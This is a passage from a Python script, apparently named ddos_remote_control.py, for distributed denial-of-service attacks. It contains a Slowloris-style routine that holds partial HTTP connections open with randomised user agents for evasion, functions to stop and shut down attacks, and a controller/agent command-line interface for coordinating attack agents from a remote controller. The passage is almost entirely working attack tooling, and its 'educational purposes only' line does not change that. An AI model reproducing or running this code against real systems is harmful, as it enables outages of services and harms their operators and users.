                    partial_request += f"Host: {parsed.hostname}\r\n"
                    
                    if evasion_integrator:
                        ua = evasion_integrator.engine.get_random_user_agent()
                    else:
                        ua = "Mozilla/5.0 (SlowLoris-DDOS/1.0)"
                    
                    partial_request += f"User-Agent: {ua}\r\n"
                    
                    conn.send(partial_request.encode())
                    connections.append(conn)
                    
                except:
                    continue
            
            # Keep connections alive briefly
            for _ in range(3):
                for conn in connections[:]:
                    try:
                        conn.send(b"X-Keep-Alive: timeout=10\r\n")
                    except:
                        connections.remove(conn)
                time.sleep(1)
            
            # Clean up
            for conn in connections:
                try:
                    conn.close()
                except:
                    pass
            
            return len(connections) > 0
        except:
            return False
    
    def _stop_ddos_attack(self):
        """Stop current DDOS attack"""
        if not self.attacking:
            print("[*] No active attack to stop")
            return
        
        print("[*] Stopping DDOS attack...")
        self.attacking = False
        self.attack_stats['attacking'] = False
    
    def shutdown_agent(self):
        """Shutdown DDOS agent"""
        print("[*] Shutting down DDOS agent...")
        self.attacking = False
        self.running = False
        print("[+] DDOS Agent shutdown complete")

def main():
    if len(sys.argv) < 2:
        print("Remote DDOS Control System")
        print("=" * 40)
        print("Usage:")
        print("  Controller: python3 ddos_remote_control.py controller [port]")
        print("  Agent: python3 ddos_remote_control.py agent <controller_ip> [port]")
        print("\nExamples:")
        print("  python3 ddos_remote_control.py controller 9999")
        print("  python3 ddos_remote_control.py agent 192.168.1.100 9999")
        print("\nFeatures:")
        print("  • Distributed DDOS coordination")
        print("  • Multiple attack vectors")
        print("  • Real-time statistics")
        print("  • Advanced evasion integration")
        print("\nEducational purposes only - use responsibly!")
        return
    
    mode = sys.argv[1].lower()
    
    if mode == 'controller':
        port = int(sys.argv[2]) if len(sys.argv) > 2 else 9999
        print(f"Starting DDOS Controller on port {port}")
        
        controller = DDOSController(port)
        controller.start_controller()
        
        try:
            controller.interactive_console()
        except KeyboardInterrupt:
            pass
        finally:
            controller.shutdown_controller()
    
    elif mode == 'agent':
        if len(sys.argv) < 3:
            print("Error: Controller IP required for agent mode")
            print("Usage: python3 ddos_remote_control.py agent <controller_ip> [port]")
            return
        
        controller_host = sys.argv[2]
        controller_port = int(sys.argv[3]) if len(sys.argv) > 3 else 9999
        
        print(f"Starting DDOS Agent - Controller: {controller_host}:{controller_port}")
        
        agent = DDOSAgent(controller_host, controller_port)
        agent.start_agent()
    
    else:
        print(f"Unknown mode: {mode}")
        print("Use 'controller' or 'agent'")

if __name__ == "__main__":
    main()